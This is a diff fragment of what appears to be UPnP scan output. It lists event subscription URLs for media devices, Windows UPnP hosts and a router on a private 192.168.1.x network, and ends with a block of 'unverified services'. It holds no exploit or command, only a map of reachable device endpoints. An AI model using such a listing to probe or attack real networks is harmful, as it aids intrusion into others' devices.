+3:      http://192.168.1.22:2870/event/AVTransport
+4:      http://192.168.1.40:2870/RenderingControl/event
+5:      http://192.168.1.1:37215/evt/Layer3Forwarding_1
+6:      http://192.168.1.40:2870/ConnectionManager/event
+7:      http://192.168.1.40:2870/AVTransport/event
+8:      http://192.168.1.40:2870/RenderingControl/event
+9:      http://192.168.1.40:2870/ConnectionManager/event
+10:     http://192.168.1.40:2870/AVTransport/event
+11:     http://192.168.1.31:2869/upnphost/udhisapi.dll?event=uuid:7ea9d240-fbe4-4ad8-8001-5074901c3695+urn:upnp-org:serviceId:RenderingControl
+12:     http://192.168.1.24:2869/upnphost/udhisapi.dll?event=uuid:e4d56268-9801-43d2-b1cf-0dbf71d3c06c+urn:upnp-org:serviceId:RenderingControl
+13:     http://192.168.1.24:2869/upnphost/udhisapi.dll?event=uuid:e4d56268-9801-43d2-b1cf-0dbf71d3c06c+urn:upnp-org:serviceId:AVTransport
+14:     http://192.168.1.24:2869/upnphost/udhisapi.dll?event=uuid:e4d56268-9801-43d2-b1cf-0dbf71d3c06c+urn:upnp-org:serviceId:ConnectionManager
+15:     http://192.168.1.1:37215/evt/WANPPPConnection_1
+
+Unverified  services:
+http://192.168.1.1:37215/evt/WANCommonInterfaceConfig_1
+http://192.168.1.1:37215/evt/WANEthernetLinkConfig_1
+http://192.168.1.1:37215/evt/LANHostConfigManagement_1
+http://192.168.1.22:49154/upnp/event/ContentDirectoryNmsO
+http://192.168.1.22:49154/upnp/event/ConnectionManagerNmsO
